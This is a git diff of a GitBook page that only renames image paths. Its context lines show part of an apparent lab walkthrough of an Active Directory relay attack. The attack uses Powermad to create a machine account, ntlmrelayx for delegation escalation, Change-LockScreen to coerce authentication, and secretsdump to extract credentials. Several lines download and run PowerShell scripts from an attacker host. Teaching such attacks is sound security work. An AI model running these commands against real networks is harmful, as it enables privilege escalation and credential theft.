@@ -75,7 +75,7 @@ iex (iwr http://192.168.248.3:8090/Powermad.ps1 -usebasicparsing)
 New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 
-![](<../../../.gitbook/assets/image (56).png>)
+![](<../../../.gitbook/assets/image (56) (1).png>)
 
 3\. Create a DNS record for webdav to our attacking machine with Invoke-DNSUpdate. The DNS record is required for webdav connection to work. It won't connect through an IP only with a hostname.
 
@@ -94,7 +94,7 @@ We now have all our prerequisites. Time to escalate our privileges.
 python3 /opt/impacket/examples/ntlmrelayx.py -t ldap://10.0.0.3 --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg
 ```
 
-![](<../../../.gitbook/assets/image (34).png>)
+![](<../../../.gitbook/assets/image (34) (1).png>)
 
 5\. Run the Change-LockScreen tool in the shell of WS01 and check the ntlmrelay output. The Change-LockScreen command will give an error but this doesn't matter:
 
@@ -103,7 +103,7 @@ iex (iwr http://192.168.248.3:8090/Change-Lockscreen.ps1 -usebasicparsing)
 change-lockscreen -webdav \\webdav@80\
 ```
 
-![](../../../.gitbook/assets/image.png)
+![](<../../../.gitbook/assets/image (1).png>)
 
 When we check the ntlmrelay output we see that `FAKE01` can now impersonate users on `WEB01`.
 
@@ -128,7 +128,7 @@ export KRB5CCNAME=administrator.ccache
 secretsdump.py -k -no-pass web01.amsterdam.bank.local
 ```
 
-![](<../../../.gitbook/assets/image (44).png>)
+![](<../../../.gitbook/assets/image (44) (1).png>)
 
 ### Cleanup
 
